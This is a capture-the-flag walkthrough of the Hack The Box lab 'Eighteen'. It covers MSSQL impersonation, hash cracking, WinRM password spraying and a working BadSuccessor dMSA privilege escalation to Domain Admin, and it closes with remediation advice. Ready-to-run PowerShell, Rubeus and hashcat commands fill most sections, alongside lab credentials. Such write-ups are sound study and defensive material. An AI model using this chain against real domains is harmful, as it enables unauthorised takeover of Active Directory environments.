# Eighteen — Walkthrough (EN)

Full compromise of the domain controller `DC01.eighteen.htb` (Windows Server 2025), from an
assumed-breach MSSQL login to Domain Admin access. This document follows the complete engagement:
reconnaissance, web enumeration, MSSQL exploitation, offline cracking,
foothold via password reuse, enumeration, and finally privilege escalation through **BadSuccessor**
(abuse of a delegated Managed Service Account).

---

## 0. Executive summary

| Item | Value                                                   |
|---|---------------------------------------------------------|
| Target | `DC01.eighteen.htb` (Windows Server 2025, Build 26100)  |
| Domain | `eighteen.htb`                                          |
| Assumed-breach | `kevin : iNa2we6haRj2gaw!` (MSSQL SQL login)            |
| Foothold | `adam.scott : iloveyou1` (WinRM)                        |
| End state | Domain Admin equivalent (arbitrary file read on the DC) |
| user.txt | `269d19*************************`                       |
| root.txt | `d7e231*************************`                       |

**Kill chain:** nmap → Flask web app → direct MSSQL (kevin → impersonate
`appdev`) → dump admin PBKDF2 hash → hashcat (`iloveyou1`) → password reuse / spray →
`adam.scott` WinRM → discover `CreateChild` over `OU=Staff` → dMSA linked to Administrator →
Kerberos ticket carries Administrator's PAC → `root.txt`.

---

## 1. Reconnaissance

Nmap (7.98, full port scan + `-sV`) against `10.129.75.57`. Only three ports visible
(`Not shown: 65532 filtered`):

| Port | Service | Version |
|---|---|---|
| 80/tcp | http | Microsoft IIS 10.0 — redirect to `http://eighteen.htb/` |
| 1433/tcp | ms-sql-s | Microsoft SQL Server 2022 (16.00.1000.00) |
| 5985/tcp | http | Microsoft HTTPAPI 2.0 (WinRM) |

- `ms-sql-ntlm-info` (1433) leaked domain info: domain `EIGHTEEN` / `eighteen.htb`, computer
  `DC01` / `DC01.eighteen.htb`, build `10.0.26100`.
- `clock-skew: ~ +7h` → relevant for Kerberos.
- DC ports 53/88/389/445/464 filtered externally; only 80, 1433, 5985 reachable.

Assumed-breach credential (from HTB machine info): **`kevin : iNa2we6haRj2gaw!`**.

---

## 2. Web enumeration (port 80)

vhost `http://eighteen.htb/` (no /etc/hosts: `curl --resolve eighteen.htb:80:10.129.75.57`). The
application is **"Flask Financial Planner v1.0"**, and the backend is confirmed in-app as
`Database: MSSQL (dc01.eighteen.htb)`.

- Login: `POST /login` (`username`+`password`), no CSRF token.
- Routes: GET `/`, `/features`, `/dashboard`, `/admin` (read-only analytics), `/login`,
  `/register`; POST-only: `/update_income` (`monthly_salary`), `/add_expense`
  (`category`, `type`, `value`), `/update_allocation` (`savings`, `investments`);
  `/delete_expense/<int:id>`.
- No `/console`, `/api`, `/.git`, backups. Directory brute-forcing (ffuf) revealed no new routes.

---

## 3. MSSQL exploitation (credential source)

Credentials were obtained via **direct authenticated MSSQL access**, not over the web. `kevin` is a
SQL Server login (SQL auth), so Windows auth does not work:

```bash
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@10.129.75.57'
```

Enumeration and path to the data:

- `kevin` is `guest@master`, **not sysadmin**. Logins: `sa`, `kevin`, `appdev`. Database of
  interest: **`financial_planner`**.
- `kevin` cannot read `financial_planner`, but **can impersonate `appdev`**:

  ```sql
  EXECUTE AS LOGIN = 'appdev';
  SELECT id, username, email, password_hash, is_admin FROM financial_planner.dbo.users;
  ```

- The `users` table has a single row:
    - `admin` / `admin@eighteen.htb` / `is_admin=1`
    - **password_hash:**
      `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`
    - Type: **Werkzeug/Flask PBKDF2-HMAC-SHA256**, 600000 iterations, salt `AMtzteQIG7yAbZIa`.

> Notes: `xp_logininfo` was denied (not sysadmin), `xp_cmdshell` was never usable, and the linked
> server `DC01` (loopback) has no login mapping — dead ends. The only usable result is the admin
> hash dump.

---

## 4. Offline cracking

The Werkzeug hash was converted to hashcat mode-10900 format:

```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

```bash
hashcat -m 10900 -a 0 hash_hashcat.txt /usr/share/wordlists/rockyou.txt -w 3
```

Result: **`iloveyou1`** (the web admin password, present in rockyou).

---

## 5. Initial foothold (password reuse / spray)

Only 80/1433/5985 are reachable (no SMB/LDAP), so the `iloveyou1` spray was aimed at WinRM. A list
of guessed usernames produced nothing; switching to a `firstname.lastname` list (insidetrust
`john.smith.txt`, ~248k entries) landed a hit:

```bash
nxc winrm 10.129.76.12 -u adam.scott -p 'iloveyou1'
# WINRM  10.129.76.12  5985  DC01  [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)

evil-winrm -i 10.129.76.12 -u adam.scott -p iloveyou1
```

`adam.scott` is in `Remote Management Users` (hence WinRM). **user.txt** was read from
`C:\Users\adam.scott\Desktop\user.txt`.

Credential order: `kevin` (given) → `admin:iloveyou1` (cracked) → `adam.scott:iloveyou1`
(reuse/spray).

---

## 6. Post-foothold enumeration

### 6.1 User context (`whoami /all`)
- `eighteen\adam.scott`, **Medium** integrity (no admin rights).
- Memberships: `BUILTIN\Remote Management Users`, `EIGHTEEN\IT` (SID `...-1604`),
  `Pre-Windows 2000 Compatible Access`.
- Privileges: `SeMachineAccountPrivilege` (Enabled), `SeChangeNotifyPrivilege`,
  `SeIncreaseWorkingSetPrivilege`.

### 6.2 Network constraints
From the attacker host, only WinRM (5985) and MSSQL (1433) are open to the DC; LDAP/Kerberos/SMB
are filtered. The target has no outbound to the attacker (tests to 80/443/8000/11601/445 → False,
ICMP denied), which rules out reverse tunnels and forces everything to be done locally on the
target over WinRM.

### 6.3 ACL enumeration (PowerView)
PowerView was **dot-sourced** (`. .\PowerView.ps1`), then ACEs for `adam.scott` and the `IT` group
were searched:

```powershell
$sids = @(
  "S-1-5-21-1152179935-589108180-1989892463-1604",  # IT
  "S-1-5-21-1152179935-589108180-1989892463-1609"   # adam.scott
)
Get-DomainObjectAcl -Identity * |
  ? { $sids -contains $_.SecurityIdentifier } |
  % { "{0} | {1} | {2}" -f $_.ObjectDN, $_.ActiveDirectoryRights, $_.ObjectAceType }
```

A single but decisive finding:

```
OU=Staff,DC=eighteen,DC=htb | CreateChild | (all object types)
```

No Kerberoast or AS-REP targets. The only vector is `CreateChild` over the OU — combined with the
fact that the target runs Windows Server 2025.

---

## 7. Vulnerability analysis — BadSuccessor

Server 2025 introduces **delegated Managed Service Accounts (dMSA)** and an account migration
mechanism. When a dMSA has `msDS-ManagedAccountPrecededByLink` set (predecessor) and
`msDS-DelegatedMSAState = 2`, the KDC treats it as the **successor** and embeds the **predecessor's
PAC** (SIDs and group memberships) into its Kerberos tickets.

**BadSuccessor** (Akamai, 2025): no real migration is required — an attacker who can **create an
object in an OU** creates a dMSA and sets those two values pointing at a privileged account
(Administrator). Both preconditions are met: Server 2025 + `CreateChild` over `OU=Staff`.

---

## 8. Tooling preparation

### 8.1 Logon type for Kerberos
WinRM is a Network logon (type 3) with no usable ticket cache (`ptt`/`klist` → `1312`).
`--logon-type 2` is denied (no interactive logon right), so **logon type 9 (NewCredentials)** via
`RunasCs` is used — a separate logon session that can hold tickets.

### 8.2 dMSA-capable Rubeus
Rubeus v2.2.0 lacks `/dmsa`. Build v2.3.3 from source with the `dotnet` SDK only (SDK-style csproj,
`net48`, NuGet `Microsoft.NETFramework.ReferenceAssemblies`):

```bash
git clone --depth 1 https://github.com/GhostPack/Rubeus.git
dotnet build build.csproj -c Release -o out
```

`Rubeus.exe` (v2.3.3) uploaded to the target over the WinRM channel as `ru.exe`.

---

## 9. Exploitation (BadSuccessor)

### 9.1 Creating the dMSA
Via ADSI with the DC specified explicitly; all MUST attributes and the password-retrieval
permission set **at creation time** (a later write fails with `8344`):

```powershell
$dc = "DC01.eighteen.htb"
$ou = [ADSI]"LDAP://$dc/OU=Staff,DC=eighteen,DC=htb"
$m  = $ou.Children.Add("CN=pwn2","msDS-DelegatedManagedServiceAccount")
$m.Properties["sAMAccountName"].Value               = "pwn2$"
$m.Properties["dnsHostName"].Value                  = "pwn2.eighteen.htb"
$m.Properties["msDS-ManagedPasswordInterval"].Value = 30
$m.Properties["userAccountControl"].Value           = 0x1000
$m.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1C
$m.Properties["msDS-DelegatedMSAState"].Value            = 2
$m.Properties["msDS-ManagedAccountPrecededByLink"].Value = "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
$adam = (New-Object System.Security.Principal.NTAccount("eighteen\adam.scott")).Translate([System.Security.Principal.SecurityIdentifier]).Value
$sd   = New-Object System.Security.AccessControl.CommonSecurityDescriptor($false,$false,"O:S-1-5-32-544G:S-1-5-32-544D:(A;;0xf01ff;;;$adam)")
$b    = New-Object byte[] $sd.BinaryLength; $sd.GetBinaryForm($b,0)
$m.Properties["msDS-GroupMSAMembership"].Value = $b
$m.CommitChanges()
```

Verification: `msDS-DelegatedMSAState=2`, link to Administrator,
`PrincipalsAllowedToRetrieveManagedPassword = EIGHTEEN\adam.scott`.

### 9.2 Kerberos ticket with Administrator's PAC
Important: **AES, not RC4** (Server 2025), and **`/opsec` is mandatory** for `asktgs /dmsa`
(without it the `PA_S4U_X509_USER` PA-DATA is not added, the KDC returns no key package, and Rubeus
throws a NullReferenceException).

```powershell
.\ru.exe hash /password:iloveyou1 /user:adam.scott /domain:eighteen.htb
# aes256 : 02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5

$h = "02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5"
$out = (.\ru.exe asktgt /user:adam.scott /aes256:$h /domain:eighteen.htb /opsec /nowrap | Out-String)
$tgt = ([regex]::Matches($out,"doI[A-Za-z0-9+/=]+") | Sort-Object {$_.Value.Length} -Descending | Select-Object -First 1).Value
.\ru.exe asktgs /targetuser:pwn2$ /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /dc:DC01.eighteen.htb /ticket:$tgt
```

The result is a TGT for `pwn2$` carrying Administrator's PAC. "Previous Keys" is empty (the
migration is faked), but the privileges come through the PAC — the ticket is sufficient.

### 9.3 Using the ticket
WinRM (type 3) cannot PTT, so the whole flow runs in a **logon-type-9** session (`x.ps1` via
`RunasCs`), reading over **SMB loopback**:

```powershell
# x.ps1 (core)
.\ru.exe ptt /ticket:$pwn | Out-Null
cmd /c "type \\DC01.eighteen.htb\C$\Users\Administrator\Desktop\root.txt"
```

```powershell
.\RunasCs.exe adam.scott iloveyou1 "powershell -ep bypass -f C:\Users\adam.scott\Documents\x.ps1" --logon-type 9
```

`klist` in that session shows the injected `pwn2$` ticket; access to `\\DC01\C$` succeeds as
Administrator.

---

## 10. Flags

| Flag | Value |
|---|---|
| user.txt | `269d19*************************` |
| root.txt | `d7e231*************************` |

---

## 11. Remediation

- **Restrict delegated rights over OUs** (`CreateChild`/write); BadSuccessor relies precisely on
  the ability to create objects in an OU.
- **Monitor dMSA accounts:** alert on creation of `msDS-DelegatedManagedServiceAccount` and on
  `msDS-ManagedAccountPrecededByLink` + `msDS-DelegatedMSAState=2`.
- **Apply Microsoft patches** for BadSuccessor on Server 2025 domain controllers.
- **No password reuse** between web and domain accounts; stronger passwords than `iloveyou1`.
- **Least privilege for SQL logins** (the `kevin→appdev` impersonation enabled the dump).

---

References:
- Akamai — "BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory" (2025).
- GhostPack / Rubeus (dMSA support in v2.3.x).
